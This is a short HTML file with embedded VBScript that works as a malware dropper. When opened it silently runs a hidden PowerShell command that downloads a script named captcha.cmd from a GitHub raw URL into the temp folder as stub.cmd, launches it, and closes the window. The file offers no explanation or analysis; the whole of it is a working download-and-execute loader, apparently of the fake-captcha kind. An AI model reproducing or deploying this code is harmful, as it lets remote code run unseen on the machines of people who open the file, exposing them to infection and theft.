<html>
<script language="VBScript">
Dim shell
Set shell = CreateObject("WScript.Shell")

downloadUrl = "https://raw.githubusercontent.com/bensgaming-dot/bensgaming-dot.github.io/refs/heads/main/code/captcha.cmd"
localPath = shell.ExpandEnvironmentStrings("%temp%\stub.cmd")
powershellCommand = "powershell -Command ""Invoke-WebRequest -Uri '" & downloadUrl & "' -OutFile '" & localPath & "'; Start-Process '" & localPath & "'"""
shell.Run powershellCommand, 0, True

window.close
</script>
</html>
